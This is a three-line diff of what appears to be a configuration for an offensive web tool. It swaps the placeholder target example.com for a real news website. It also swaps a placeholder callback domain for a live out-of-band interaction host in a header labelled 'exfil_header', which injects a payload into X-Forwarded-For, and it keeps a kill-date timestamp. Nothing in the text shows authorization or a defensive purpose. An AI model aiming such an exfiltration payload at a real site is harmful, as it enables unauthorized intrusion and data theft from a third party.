@@ -1,3 +1,3 @@
-target_url = "https://example.com/"
-exfil_header = "'X-Forwarded-For': '{{PAYLOAD}}.interactshdomain.com'"
+target_url = "https://newsweek.com"
+exfil_header = "'X-Forwarded-For': '{{PAYLOAD}}.kxctzbmczuslqxjntjrd0tboe8q8i6fqw.oast.fun'"
 killdate_timestamp = "1752514839"
